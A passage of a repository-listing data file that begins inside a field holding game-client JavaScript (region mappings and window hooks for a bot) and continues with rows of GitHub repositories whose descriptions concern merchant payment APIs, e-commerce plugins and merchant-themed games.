AM: ""JP-Tokyo"",                         AW: ""US-Atlanta"",                         AU: ""SG-Singapore"",                         AT: ""EU-London"",                         AZ: ""JP-Tokyo"",                         BS: ""US-Atlanta"",                         BH: ""JP-Tokyo"",                         BD: ""JP-Tokyo"",                         BB: ""US-Atlanta"",                         BY: ""EU-London"",                         BE: ""EU-London"",                         BZ: ""US-Atlanta"",                         BJ: ""EU-London"",                         BM: ""US-Atlanta"",                         BT: ""JP-Tokyo"",                         BO: ""BR-Brazil"",                         BQ: ""US-Atlanta"",                         BA: ""EU-London"",                         BW: ""EU-London"",                         BR: ""BR-Brazil"",                         IO: ""JP-Tokyo"",                         VG: ""US-Atlanta"",                         BN: ""JP-Tokyo"",                         BG: ""EU-London"",                         BF: ""EU-London"",                         BI: ""EU-London"",                         KH: ""JP-Tokyo"",                         CM: ""EU-London"",                         CA: ""US-Atlanta"",                         CV: ""EU-London"",                         KY: ""US-Atlanta"",                         CF: ""EU-London"",                         TD: ""EU-London"",                         CL: ""BR-Brazil"",                         CN: ""CN-China"",                         CX: ""JP-Tokyo"",                         CC: ""JP-Tokyo"",                         CO: ""BR-Brazil"",                         KM: ""EU-London"",                         CD: ""EU-London"",                         CG: ""EU-London"",                         CK: ""SG-Singapore"",                         CR: ""US-Atlanta"",                         CI: ""EU-London"",                         HR: ""EU-London"",                         CU: ""US-Atlanta"",                         CW: ""US-Atlanta"",                         CY: ""JP-Tokyo"",                         CZ: ""EU-London"",                         DK: ""EU-London"",                         DJ: ""EU-London"",                         DM: ""US-Atlanta"",                         DO: ""US-Atlanta"",                         EC: ""BR-Brazil"",                         EG: ""EU-London"",                         SV: ""US-Atlanta"",                         GQ: ""EU-London"",                         ER: ""EU-London"",                         EE: ""EU-London"",                         ET: ""EU-London"",                         FO: ""EU-London"",                         FK: ""BR-Brazil"",                         FJ: ""SG-Singapore"",                         FI: ""EU-London"",                         FR: ""EU-London"",                         GF: ""BR-Brazil"",                         PF: ""SG-Singapore"",                         GA: ""EU-London"",                         GM: ""EU-London"",                         GE: ""JP-Tokyo"",                         DE: ""EU-London"",                         GH: ""EU-London"",                         GI: ""EU-London"",                         GR: ""EU-London"",                         GL: ""US-Atlanta"",                         GD: ""US-Atlanta"",                         GP: ""US-Atlanta"",                         GU: ""SG-Singapore"",                         GT: ""US-Atlanta"",                         GG: ""EU-London"",                         GN: ""EU-London"",                         GW: ""EU-London"",                         GY: ""BR-Brazil"",                         HT: ""US-Atlanta"",                         VA: ""EU-London"",                         HN: ""US-Atlanta"",                         HK: ""JP-Tokyo"",                         HU: ""EU-London"",                         IS: ""EU-London"",                         IN: ""JP-Tokyo"",                         ID: ""JP-Tokyo"",                         IR: ""JP-Tokyo"",                         IQ: ""JP-Tokyo"",                         IE: ""EU-London"",                         IM: ""EU-London"",                         IL: ""JP-Tokyo"",                         IT: ""EU-London"",                         JM: ""US-Atlanta"",                         JP: ""JP-Tokyo"",                         JE: ""EU-London"",                         JO: ""JP-Tokyo"",                         KZ: ""JP-Tokyo"",                         KE: ""EU-London"",                         KI: ""SG-Singapore"",                         KP: ""JP-Tokyo"",                         KR: ""JP-Tokyo"",                         KW: ""JP-Tokyo"",                         KG: ""JP-Tokyo"",                         LA: ""JP-Tokyo"",                         LV: ""EU-London"",                         LB: ""JP-Tokyo"",                         LS: ""EU-London"",                         LR: ""EU-London"",                         LY: ""EU-London"",                         LI: ""EU-London"",                         LT: ""EU-London"",                         LU: ""EU-London"",                         MO: ""JP-Tokyo"",                         MK: ""EU-London"",                         MG: ""EU-London"",                         MW: ""EU-London"",                         MY: ""JP-Tokyo"",                         MV: ""JP-Tokyo"",                         ML: ""EU-London"",                         MT: ""EU-London"",                         MH: ""SG-Singapore"",                         MQ: ""US-Atlanta"",                         MR: ""EU-London"",                         MU: ""EU-London"",                         YT: ""EU-London"",                         MX: ""US-Atlanta"",                         FM: ""SG-Singapore"",                         MD: ""EU-London"",                         MC: ""EU-London"",                         MN: ""JP-Tokyo"",                         ME: ""EU-London"",                         MS: ""US-Atlanta"",                         MA: ""EU-London"",                         MZ: ""EU-London"",                         MM: ""JP-Tokyo"",                         NA: ""EU-London"",                         NR: ""SG-Singapore"",                         NP: ""JP-Tokyo"",                         NL: ""EU-London"",                         NC: ""SG-Singapore"",                         NZ: ""SG-Singapore"",                         NI: ""US-Atlanta"",                         NE: ""EU-London"",                         NG: ""EU-London"",                         NU: ""SG-Singapore"",                         NF: ""SG-Singapore"",                         MP: ""SG-Singapore"",                         NO: ""EU-London"",                         OM: ""JP-Tokyo"",                         PK: ""JP-Tokyo"",                         PW: ""SG-Singapore"",                         PS: ""JP-Tokyo"",                         PA: ""US-Atlanta"",                         PG: ""SG-Singapore"",                         PY: ""BR-Brazil"",                         PE: ""BR-Brazil"",                         PH: ""JP-Tokyo"",                         PN: ""SG-Singapore"",                         PL: ""EU-London"",                         PT: ""EU-London"",                         PR: ""US-Atlanta"",                         QA: ""JP-Tokyo"",                         RE: ""EU-London"",                         RO: ""EU-London"",                         RU: ""RU-Russia"",                         RW: ""EU-London"",                         BL: ""US-Atlanta"",                         SH: ""EU-London"",                         KN: ""US-Atlanta"",                         LC: ""US-Atlanta"",                         MF: ""US-Atlanta"",                         PM: ""US-Atlanta"",                         VC: ""US-Atlanta"",                         WS: ""SG-Singapore"",                         SM: ""EU-London"",                         ST: ""EU-London"",                         SA: ""EU-London"",                         SN: ""EU-London"",                         RS: ""EU-London"",                         SC: ""EU-London"",                         SL: ""EU-London"",                         SG: ""JP-Tokyo"",                         SX: ""US-Atlanta"",                         SK: ""EU-London"",                         SI: ""EU-London"",                         SB: ""SG-Singapore"",                         SO: ""EU-London"",                         ZA: ""EU-London"",                         SS: ""EU-London"",                         ES: ""EU-London"",                         LK: ""JP-Tokyo"",                         SD: ""EU-London"",                         SR: ""BR-Brazil"",                         SJ: ""EU-London"",                         SZ: ""EU-London"",                         SE: ""EU-London"",                         CH: ""EU-London"",                         SY: ""EU-London"",                         TW: ""JP-Tokyo"",                         TJ: ""JP-Tokyo"",                         TZ: ""EU-London"",                         TH: ""JP-Tokyo"",                         TL: ""JP-Tokyo"",                         TG: ""EU-London"",                         TK: ""SG-Singapore"",                         TO: ""SG-Singapore"",                         TT: ""US-Atlanta"",                         TN: ""EU-London"",                         TR: ""TK-Turkey"",                         TM: ""JP-Tokyo"",                         TC: ""US-Atlanta"",                         TV: ""SG-Singapore"",                         UG: ""EU-London"",                         UA: ""EU-London"",                         AE: ""EU-London"",                         GB: ""EU-London"",                         US: ""US-Atlanta"",                         UM: ""SG-Singapore"",                         VI: ""US-Atlanta"",                         UY: ""BR-Brazil"",                         UZ: ""JP-Tokyo"",                         VU: ""SG-Singapore"",                         VE: ""BR-Brazil"",                         VN: ""JP-Tokyo"",                         WF: ""SG-Singapore"",                         EH: ""EU-London"",                         YE: ""JP-Tokyo"",                         ZM: ""EU-London"",                         ZW: ""EU-London""                     },                     L = null;                 d.connect = Ca;                  //UPDATE                 /**                  * Tells you if the game is in Dark mode.                  * @return Boolean for dark mode.                  */                 window.getDarkBool = function() {                     return ta;                 }                  /**                  * Tells you if the mass is shown.                  * @return Boolean for player\'s mass.                  */                 window.getMassBool = function() {                     return lb;                 }                  /**                  * This is a copy of everything that is shown on screen.                  * Normally stuff will time out when off the screen, this                  * memorizes everything that leaves the screen for a little                  * while longer.                  * @return The memory object.                  */                 window.getMemoryCells = function() {                     return interNodes;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCellsArray = function() {                     return v;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCells = function() {                     return E;                 }                  /**                  * Returns an array with all the player\'s cells.                  * @return Player\'s cells                  */                 window.getPlayer = function() {                     return k;                 }                  /**                  * The canvas\' width.                  * @return Integer Width                  */                 window.getWidth = function() {                     return m;                 }                  /**                  * The canvas\' height                  * @return Integer Height                  */                 window.getHeight = function() {                     return r;                 }                  /**                  * Scaling ratio of the canvas. The bigger this ration,                  * the further that you see.                  * @return Screen scaling ratio.                  */                 window.getRatio = function() {                     return h;                 }                  /**                  * [getOffsetX description]                  * @return {[type]} [description]                  */                 window.getOffsetX = function() {                     return aa;                 }                  window.getOffsetY = function() {                     return ba;                 }                  window.getX = function() {                     return s;                 }                  window.getY = function() {                     return t;                 }                  window.getPointX = function() {                     return ia;                 }                  window.getPointY = function() {                     return ja;                 }                  /**                  * The X location of the mouse.                  * @return Integer X                  */                 window.getMouseX = function() {                     return fa;                 }                  /**                  * The Y location of the mouse.                  * @return Integer Y                  */                 window.getMouseY = function() {                     return ga;                 }                  window.getMapStartX = function() {                     return pa;                 }                  window.getMapStartY = function() {                     return qa;                 }                  window.getMapEndX = function() {                     return ra;                 }                  window.getMapEndY = function() {                     return sa;                 }                  window.getScreenDistance = function() {                     var temp = screenDistance();                     return temp;                 }                  /**                  * A timestamp since the last time the server sent any data.                  * @return Last update timestamp                  */                 window.getLastUpdate = function() {                     return C;                 }                  window.getCurrentScore = function() {                     return R;                 }                  /**                  * The game\'s current mode. ("":ffa"", "":experimental"", "":teams"". "":party"")                  * @return {[type]} [description]                  */                 window.getMode = function() {                     return P;                 }                  window.getServer = function() {                     return serverIP;                 }                  window.setPoint = function(x, y) {                     ia = x;                     ja = y;                 }                  window.setScore = function(a) {                     sessionScore = a * 100;                 }                  window.setBestTime = function(a) {                     bestTime = a;                 }                  window.best = function(a, b) {                     setScore(a);                     setBestTime(b);                 }                  window.setBotIndex = function(a) {                     console.log(""Changing bot"");                     botIndex = a;                 }                  window.setMessage = function(a) {                     message = a;                 }                 window.updateBotList = function() {                     window.botList = window.botList || [];                      window.jQuery(\'#locationUnknown\').text("""");                      window.jQuery(\'#locationUnknown\').append(window.jQuery(\'<select id=""bList"" class=""form-control"" onchange=""setBotIndex($(this).val());"" />\'));                     window.jQuery(\'#locationUnknown\').addClass(\'form-group\');                      for (var i = 0; i < w",,3
0,https://github.com/qiulingfeng905/Wish-Merchant-API.git,Wish Merchant API,,2
0,https://github.com/UltraCart/my_account.git,Customer Portal for UltraCart merchants,,2
0,https://github.com/antonsoft0710/iOS_Blockchain_Merchant-App-.git,"iOS, Blockchain, Merchant pro",,2
0,https://github.com/byteball/obyte-merchant.git,Chatbot for a merchant on Byteball network,,2
0,https://github.com/Redacted-Games-LLC/Merchant-Empires.git,A space merchant game of war,,2
0,https://github.com/TeamCommercium/invenstory.git,An inventory management and price tracking tool for amazon merchants.,,2
0,https://github.com/halt-avmc/p24api.git,Privat24 merchant API,,2
0,https://github.com/Bitcoin-com/bip70-merchant-services.git,bip70-merchant-services,,2
0,https://github.com/veritrans/mobile-merchant-server.git,A simple reference implementation for the Mobile SDK merchant server.,,2
0,https://github.com/RazerMS/OpenCart_Plugin.git,Razer Merchant Services OpenCart Shopping Cart Plugin v1.5.0,,2
0,https://github.com/italia/18app-php-sdk.git,PHP SDK for developing merchant applications which accept 18app vouchersÔøº,,2
0,https://github.com/opendns/merchant-esolutions-php.git,"{""PHP Client for Merchant e-Solutions' payment gateway APIs""}",,2
0,https://github.com/nimi0112/PaytmIntegration-Android.git,Paytm sample merchant app for testing purpose only.,,2
0,https://github.com/bitpay/merchant-server-check.git,Server environmental check script to determine if a BitPay merchant has the correct dependencies installed,,2
0,https://github.com/coinsecure/plugins.git,"Coinsecure Programming Libraries for Wallet, Exchange & Merchant",,2
0,https://github.com/yii-dream-team/yii2-platron.git,Platron.ru payment system merchant API,,2
0,https://github.com/WHMCS/sample-remote-input-gateway.git,Sample Remote Input Tokenisation Merchant Payment Gateway Module for WHMCS,,2
0,https://github.com/dapic/spree_offsite_payments.git,"Integrates Shopify Offsite_Payments (extracted the ""billing integration"" code from Active_Merchant) with Spree Commerce",,2
0,https://github.com/COINQVEST/php-merchant-sdk.git,PHP Merchant SDK for COINQVEST. Programmatically accept and settle payments in digital currencies.,"payment-gateway,payment-integration,payment-processing,cryptocurrencies,cryptocurrency,digital-currencies,payment-processor",2
0,https://github.com/RazerMS/Inpage_Checkout.git,Razer Merchant Services Inpage Checkout,,2
0,https://github.com/tokenio/merchant-sample-js.git,Very simple merchant checkout example,,2
0,https://github.com/FahadYousafMahar/Easypay-WHMCS-Gateway.git,üåé [WHMCS Module] üí∞ EasyPay (EasyPaisa) Merchant Gateway for WHMCS,"whmcs-payment-gateway,easypaisa,easypay,whmcs-easypay,whmcs,whmcs-easypaisa-module,whmcs-easypay-module",2
0,https://github.com/channelengine/merchant-api-client-php.git,ChannelEngine Merchant API Client for PHP,,2
0,https://github.com/frozzare/go-swish.git,Go package for the Swish merchant API,"swish,payment",2
0,https://github.com/sahlhoff/merchant-category-codes.git,Merchant Category Codes for credit card transactions.,"credit-card,finance,financial-analysis,credit-card-payments",2
0,https://github.com/Everan-1994/merchants-h5.git,merchants h5,,2
0,https://github.com/ConnecticutDigital/Thomas-Bartram-Digital-Archives.git,"Merchant and shipping account log book manuscript in early 19th century Fairfield, Connecticut",,2
0,https://github.com/cheesefish/happy_merchant.git,Making merchants happy again,,2
0,https://github.com/italia/18app-dotnet-sdk.git,.NET SDK for developing merchant applications which accept 18app vouchers,dotnet,2
0,https://github.com/hayzem/woocommerce-iyzico-plugin.git,Plugin for iyzico payment system with multi-merchant support.,,2
0,https://github.com/italia/18app-python-example.git,Python SDK for developing merchant applications which accept 18app vouchers,python,2
0,https://github.com/RazerMS/Hosted_Payment_for_Shopify_Plugin.git,Hosted Payment for Shopify develop by Razer Merchant Services technical team.,,2
0,https://github.com/COINQVEST/nodejs-merchant-sdk.git,NodeJS Merchant SDK for COINQVEST. Programmatically accept and settle payments in digital currencies.,"cryptocurrency,cryptocurrencies,payment-gateway,payment-integration,payment-processing,payment-processor,digital-currencies",2
0,https://github.com/bitex-coin/merchant-mobile.git,Bitex Crypto Exchange Android Client for Merchants,,2
0,https://github.com/ZzcChen/FiveCrowdsourcing-Merchant.git,FiveCrowdsourcing-Merchant,fivecrowdsourcing-merchant,2
0,https://github.com/Shopify-UK/Shopify-Alipay-Integration.git,Help Shopify UK Merchants Add Alipay Payment Gateway,,2
0,https://github.com/BrianLa0616/Merchants.git,Game that uses merchants to win the game.,,2
0,https://github.com/ish2852/MokiMerchantAPP.git,Merchant App Upload,,2
0,https://github.com/exviva/activemerchant-clickandbuy.git,Active Merchant ClickandBuy gateway,,2
0,https://github.com/LMiceOrg/lmalpha.git,Lmice Merchant for ALPHA,,2
0,https://github.com/samirrayani/metascraper-shopping.git,A custom rule bundle for @microlinkhq/metascraper to get product properties from HTML markup on merchant websites,,2
0,https://github.com/altdg/bulk_mapper.git,Altdg bulk mapping tool for the merchant and domain mapper API https://developer.altdg.com/,,2
0,https://github.com/cennznet/xpay-runtime-tutorial.git,A tutorial to build a merchant payment gateway by using CENNZNet protocols like CENNZX exchange,,2
0,https://github.com/erdbehrmund/privat24.git,Privat 24 merchant API gem,,2
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-a-be.git,merchant-marketplace project for Labspt17,labspt17,2
0,https://github.com/mivaecommerce/readytheme-optics.git,Miva Merchant Optics Ready Theme,,2
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-a-fe.git,merchant-marketplace project for Labspt17,labspt17,2
0,https://github.com/ankulrastogi/xephyr.git,managing merchant payments and transactions,,2
0,https://github.com/kcelestinomaria/Tenderbox.git,Tenderbox is a decentralized tender bidding and product sourcing platform for small businesses and merchants,"nearprotocol,dapp,e-commerce,smart-contracts,rust-lang,react",2
0,https://github.com/BuddaT/MailMerchants.git,Wurm Unlimited server mod to allow trading with merchants remotely via a mailbox,,2
0,https://github.com/matthewcline/DashMap.git,React Native app to display merchants in Colombia who accept Dash currency,,2
0,https://github.com/appoets/omnipay-payubiz.git,PayU Biz payment gateway integration to Laravel for merchants in India.,,2
0,https://github.com/opengento/magento2-document-product-link.git,This module aims to help merchants to link their documents to products in Magento 2.,"php,magento2,magento,magento2-module,magento2-extension,magento-extension,magento-module,magento2-extension-free,magento-2,document-management,attachment,linked-list",2
0,https://github.com/zacbrac/Variant-Based-Reports.git,Variant Based reports for Miva Merchant Stores,,2
0,https://github.com/CaueFurui/O-Guia-Do-Comerciante-Das-Galaxias-Node.js.git,"Solution for Merchant, a Journey in Galaxys",,2
0,https://github.com/jonaphin/active_paypal_adaptive_accounts.git,PayPal Adaptive Accounts for Active Merchant,,2
0,https://github.com/AbdullahValley/Newspaper-Association.git,Merchant Management for a Newspaper Association.,,2
0,https://github.com/csc-egov/Bridge-Merchant-HTML-template.git,Sample HTML template for creating Merchant applications,,2
0,https://github.com/takehiro177/Kaggle-Elo-63th-Solution.git,Kaggle Elo Merchant Category Recommendation Competition,,2
0,https://github.com/Rebilly/merchant-category-codes.git,A library with merchant category codes.,,2
0,https://github.com/3rdex/stable-bank.git,Merchant payment solution on stable coins.,,2
0,https://github.com/zgabievi/laravel-bog-console.git,Bank of Georgia Merchant Console OpenAPI Helper,,2
0,https://github.com/theworkerant/QuantumGateway-4-ActiveMerchant.git,A quantum gateway module for active_merchant,,2
0,https://github.com/scout-2766/Iso4J.git,"Enhanced java enum for standards ISO 3166 (countries), ISO 4217 (currencies), ISO 639 (languages) + ISO18245 (Merchant Category Codes)",,2
0,https://github.com/ziggr/ESO-LibPrice.git,"{""ESO Add-on library for fetching price data from other add-ons such as Master Merchant or Arkadius' Trade Tools""}",,2
0,https://github.com/Byron/merchants-guide.git,An implementation of the merchants guide coding challenge in Rust the way I would love to see it,,2
0,https://github.com/breakthru2/Fargomine.git,Fargomine is a digital currency wallet and platform where merchants and consumers can transact with a digital currencies bitcoin.,,2
0,https://github.com/bporcelli/simplesalestax.git,Simple Sales Tax integrates TaxCloud and WooCommerce to make it easier for merchants to comply with sales tax laws.,,2
0,https://github.com/AndreasA/iso-payment-mpay24-wmbi.git,Isotope Payment Module for mPay24 WMBI (Webbased Merchant Billing Interface),,2
0,https://github.com/RazerMS/rms-mobile-xdk-xamarin-ios.git,Razer Merchant Services mobile payment for Xamarin (Native iOS),,2
0,https://github.com/be2bill/merchant-api-guidelines.git,The implementation recommandations for merchant API implementations in different languages,,2
0,https://github.com/mismith/cavirtex-php.git,"{""PHP wrapper for Canadian Virtual Exchange's Merchant API""}",,2
0,https://github.com/munisisazade/millikart-python.git,Milli Cart Merchant Payment Script for all Python websites,"payment,payment-request,millikart-python",2
0,https://github.com/TCK1997/7knots.git,A seafaring merchant game set in the 17th century.,,2
0,https://github.com/integrationmonitoring/moneta-c-sharp-sdk.git,C# SDK to create moneta merchant API driven application,,2
0,https://github.com/michaelschade/py-QBMS.git,An implementation of the Intuit¬Æ QuickBooks¬Æ Merchant Service API.,,2
0,https://github.com/igray/gsqbms.git,Quickbooks Merchant Services plug-in for WP e-Commerce,,2
0,https://github.com/unzerdev/java-sdk.git,Java SDK for integrating with Unzer Merchant Gateway ,,2
0,https://github.com/sscruggs/achdirect-active_merchant.git,Fork of active_merchant with ACHDirect support including echeck,,2
0,https://github.com/rubendivall/survey-opt-in-ps-17.git,Survey opt-in for Google Merchant Center Prestashop 1.7,,2
0,https://github.com/brendanhasz/loyalty-prediction.git,"{""Jupyter notebooks for Kaggle's Elo Merchant Category Recommendation""}",,2
0,https://github.com/VirtoCommerce/vc-module-MeS.git,Merchant e-Solutions (MeS) Payment Gateway integration module,,2
0,https://github.com/tbclla/laravel-revolut-merchant.git,"{""An unofficial Laravel wrapper for Revolut's Merchant API""}",,2
0,https://github.com/robksawyer/merchit.git,Converts the Squarespace Shop feed e.g. http://mysite.squarespace.com/shop?format=json-pretty into a parsable format that can be submitted to your Google Merchant Center (https://www.google.com/merchants).,,2
0,https://github.com/Alexintosh/pg.git,Decentralized Payment Gateway that enables Merchants to accept payments in GO and ERC20 tokens without being exposed to the volatility of the specific currency used during the transaction.,,2
0,https://github.com/meng1204/canada-wechat-alipay.git,Integrate Wechat Pay and Alipay through Alpha Pay Payment Gateway APIs. Allow Canadian merchants to easily accept Wechat Pay and Alipay for their E-commerce Platform.,,2
0,https://github.com/Arcadier/Minimum-Order-Quantity.git,"With this plug-in, merchants on your marketplace can specify a minimum number of order units for any of product inventory before a customer order is confirmed.","arcadier,plug-in,marketplace,bulk,orders",2
0,https://github.com/fraudlabspro/smsverification-magento2.git,FraudLabs Pro SMS Verification is an extension that help merchants to authenticate the client‚Äôs identity by sending them a SMS for verification in Magento 2.,"sms-verification,magento2,fraudlabspro,fraud-prevention,fraud-protection,fraud-detection,magento2-module,magento2-extension",2
0,https://github.com/bigbinary/binary_merchant.git,A payment processing utility tool built on top of Active Merchant,,2
0,https://github.com/Mrcomputer1/SmileyPlayerTrader.git,Allows you to trade with players using the villager merchant UI.,"spigot,bukkit,bukkit-plugin,spigot-plugin",2
0,https://github.com/ghassani/miva-provision.git,"{""Utilities, helpers, and wrappers for dealing with Miva Merchant Provisioning API's""}",,2
0,https://github.com/Tonku/Merchants-guide-to-the-galaxy-swift.git,"{""swift 2.2 implementation of puzzle Merchant's guide to the galaxy""}",,2
0,https://github.com/jonathonbyrdziak/Optimized-Magento-1.9.x.git,"Merchant Protocol has Optimized this Magento for higher conversion rates, SEO and speed",,2
0,https://github.com/apruve/apruve-ruby-demo.git,Demonstration of the apruve-ruby client library in a mock merchant website using Sinatra.,,2
0,https://github.com/SwedbankPay/swedbank-pay-sdk-mobile-example-merchant.git,The example website and API for the merchant backend of the iOS and Android SDKs,,2
0,https://github.com/asukhadi/litecoin-monitor.git,Monitor Litecoin for new transactions and initiate user-defined callbacks. Litecoin Merchant API,,2
0,https://github.com/jaredmell/Pagos-Online-Gateway-for-JigoShop.git,"Implementation for Pagos Online merchant, the leading payment gateway from Colombia",,2
0,https://github.com/JosefBud/lightspeed-amazon-sync.git,A Node.js app to sync inventory counts between Lightspeed Retail and an Amazon merchant account,,2
0,https://github.com/ResidualToken/unfederalreserve-merchantlobby.git,Smart contracts and code for unFederalReserve tokens and our new Merchant Banking Lobby.,,2
0,https://github.com/Sharnw/avored-merchant-warrior.git,Merchant Warrior card payments module for AvoRed Open Source Laravel Shopping Cart,,2
0,https://github.com/sinefunc/testopia.git,"a collection of test helpers for ohm, active merchant, rack test",,2
0,https://github.com/zixipay/zixipay.github.io.git,"ZixiPay Wallet API - Bitcoin Wallet API, Tether Wallet API, Ethereum Wallet API and Litecoin Wallet API, Crypto Payment API, Crypto Merchant Account, Crypto Payment API, Tether TRC20, Tether ERC20, Crypto Merchant Account","bitcoin-wallet-api,tether-wallet-api,ethereum-wallet-api,litecoin-wallet-api,tether-wallet,bitcoin-wallet,ethereum-wallet,litecoin-wallet,crypto-payment,crypto-payment-api,crypto-merchant-account,crypto-payment-gateway,wallet-services,accept-crypto-payments,zixipay-wallet-api,tether-trc20,tether-erc20,tether-omni,crypto-acquiring",2
0,https://github.com/goelrohan6/discoverMe.git,Making Everything nearby you more searchable as google does not plot everyone on map which is the need of the hour. It will also help merchants to get online and make themselves and their deals more searchble.,,2
0,https://github.com/TheToddLuci0/Tarkov-Scammer.git,"Uses the Tarkov-Market API to find things listed on the market for lower values than the selling price to in-game merchants, allowing for the scamming of less fortunate players.",,2
0,https://github.com/ghassani/miva-global-pre-render.git,Global Pre Render Module for Miva Merchant 5.5. Execute miva template logic before a screen begins to be rendered.,,2
0,https://github.com/ttcremers/GrayAutoSell.git,Vanilla World of Warcraft AddOn. Automatically sells all your gray bag items when you interact with a merchant.,"warcraft-addon,vanilla,bag,merchant",2
0,https://github.com/DreanorESOUI/SellOrnateItems.git,Addon for Elder Scrolls Online - Sells all items in the inventory to the merchant that give x% more gold.,"addon,gold,elder-scrolls-online,lua,inventory,esoui",2
0,https://github.com/ankitkanojia/Payment-Gateways.git,"A payment gateway is a merchant service provided by an e-commerce application service provider that authorizes credit card or direct payments processing for e-businesses, online retailers, bricks and clicks, or traditional brick and mortar.",,2
0,https://github.com/suzan-1515/Adversify-Client.git,Adversify - Offline Digital Advertisement and Marketing app developed for the final year college project. This project is an android application developed using JAVA programming language. This app is for client. Merchant app is on another repo.,"android,ble,nearby-connection,wireless-communication,room,java",2
0,https://github.com/StocksExchange/nodejs-client.git,"{""STEX (former Stocks.Exchange) provides all the core exchange functionality, and additional merchant tools available via the HTTP API where all returned messages are in JSON. It's much easier to work with the API by using one of the clients provided by STEX, so while this page describes the API in case you want or need to build your own client, the examples use the Node JS client.""}",,2
0,https://github.com/cohortfsllc/dmclock.git,"Code that implements the dmclock distributed quality of service algorithm. See ""mClock: Hanling Throughput Variability for Hypervisor IO Scheduling"" by Gulati, Merchant, and Varman.",,2
0,https://github.com/Mvesesani/woocommerce-bulk-edit-product-image.git,This plugin adds an image selection option to the WooCommerce product bulk edit screen allowing the merchant to set an image to multiple products at once.,,2
0,https://github.com/seb86/wc-admin-notice-example.git,"{""Adds a note to the merchant's inbox showing dummy text and two action buttons. Can be used as a template for creating your own.""}",,2
0,https://github.com/kassent/BarterFix.git,"{""This is a SKSE plugin which fixes an issue where the player can't get any money from trading when merchant's golds reaches a certain value.""}",,2
0,https://github.com/successtar/jumga.git,Flutterwave code challenge for an Ideal E-commerce platform where merchant set up their platform with a token and have their shop running within seconds.,"fluuterwave,challenge,code,e-commerce,merchant",2
0,https://github.com/druglizard/grand-bazaar.git,"Grand Bazaar: Open-Source bitcoin merchant-trading platform, ebay/amazon like, with seller and buyer ratings, product reviews, resolution system, anonymity",,2
0,https://github.com/GillianShanks/moneydragon.git,Spending Tracker web app - to add spending that is tagged with a merchant and a type. Codeclan Week 5 ruby project.,,2
0,https://github.com/porousnapkin/TradeRL.git,"{""Building a roguelike where you play as a merchant setting up trade routes in a dangerous world. It's a Unity C# project.""}",,2
0,https://github.com/aaditya1111/e-commerce-website-for-Artisans..git,At this Website Any Artisan can sell their product as Merchant and purchase their Product as Costumer. It was developed by me during my summer internship.,,2
0,https://github.com/siteshop-ph/dragonpay-autocomplete-paid-order-for-woocommerce.git,"{""This plugin is ONLY for merchants that sell ONLY intangible items, it's need manual FTP install at root off your WP install (a new folder mu-plugin will be located within wp-content folder) not like common plugins , this plugin will not be displayed at all like other wp plugins in wp dasboard""}",,2
0,https://github.com/linseycurrie/Spending-Tracker.git,"First Solo Project using Python, Flask and PostgreSQL. It is a web application that allows users to input transactions linked to a date, merchant and category. These transactions can be saved, updated and deleted from the database. The User can also manipulate the transactions to see then based on criteria such as month, user, category and merchant. ","python,html,css,flask,postgresql,psycopg,rest,mvc,spending-tracker",2
0,https://github.com/MUTETHIA/IPAY-Integration-With-Codeigniter.git,"iPay is an innovative payments processing solution and payment gateway for Africa. iPay is an easy-to-use payments processing system that incorporates VISA, Mastercard, Kenswitch, M-PESA, Airtel Money & eLipa wallet modes of payment. Integrating with merchant is key if you have to receive payments",,2
0,https://github.com/ayushreal/PointOfSale.git,"The point of sale (POS) or point of purchase (POP) is the time and place where a retail transaction is completed. At the point of sale, the merchant calculates the amount owed by the customer, indicates that amount, may prepare an invoice for the customer (which may be a cash register printout), and indicates the options for the customer to make payment.","pointofsale,management-system,management-project,java-porject,core-java-projects",2
0,https://github.com/hasinichathu/POS.git,"At the point of sale, the merchant calculates the amount owed by the customer, indicates that amount, may prepare an invoice for the customer, and indicates the options for the customer to make payment.",,2
0,https://github.com/cpadsala/Queue-Me-In.git,"{""QmeIn - A Virtual 'Q' for All   Description:  QmeIn web application is designed for users to free themselves from the constraints of a physical line. QmeIn is a virtual queue that no longer requires the user to be present at a real queue at all times. With the tap of a button, a user places themselves in a virtual queue which proceeds as a real queue. Whether the queue is at the DMV, a bank, a restaurant, a stadium ticket counter, a parking lot, our own Titan bookstore, or the countless other locations that require people to stand in line, QmeIn will seamlessly do the waiting for the user.    Process:   QmeIn provides the user with a list of merchants who have queues currently open. The user can select a specific merchant and queue themselves in with a simple tap of the 'QmeIn' button. Once the user queues in, they are entered into a virtual queue and notified of their position, as well as an estimated time to the point of transaction. The user will, thus, be free from having to be present and waiting in a physical line allowing them to multi-task, or simply relax. As the queue proceeds, the user will be notified through an SMS when they are third from the point of transaction, thus giving them ample time to proceed to the physical line to complete their transaction.   When a merchant logs in to QmeIn, they are provided with a list of users currently in queue and the time elapsed on the current transaction. Once the merchant has completed the transaction with the current user, they will tap the 'Complete' button and remove that user from the queue. The queue then proceeds forward with the next user.    Highlights:  Before even entering a virtual queue, QmeIn provides information to the user on how many people are in the current queue for a merchant, as well as, their average time of transaction. This information can guide users to prudently allocate their time.   Users are not bound to a queue, just as a physical line, they can walk away from their position in line. In QmeIn, the user has the option to simply tap 'QmeOut' and walk away from the queue in a single step.   Future:  QmeIn will provide not only an effortless means to get in a queue for the user, but it will also provide critical data to merchants. As the number of queues and users within them increase, merchants will be able to obtain more accurate times of transaction for each user. The merchant will also become aware of time periods which occupy the highest number of transactions and the lowest. Furthermore, as 'QmeOut' data aggregates, the merchant will know when the highest number of users are lost to wait times. All this real-time data provided from QmeIn will guide merchants to more efficiently manage their labor and other assets.     Conclusion:  As software etches itself as a required element of our daily livelihood, QmeIn continues this momentum with an abstraction of reality. QmeIn manipulates the physical sense in a virtual environment to give physical freedom to its user. The web app removes constraints allowing users to allocate their physical being at their discretion and benefit.    Technologies Used:  Node.js, Express Framework, JavaScript, MongoDB, Mongoose, Handlebars, HTML 5, CSS 3""}",,2
0,https://github.com/SrimalPriyanga/epos-system.git,"Electronic Point of Sales System. --Point of sale (also called POS or checkout, during computerization later becoming electronic point of sale or EPOS) is the place where a retail transaction is completed. It is the point at which a customer makes a payment to the merchant in exchange for goods or services. At the point of sale the retailer would calculate the amount owed by the customer and provide options for the customer to make payment. The merchant will also normally issue a receipt for the transaction. (Definition uproot from Wikipedia)",,2
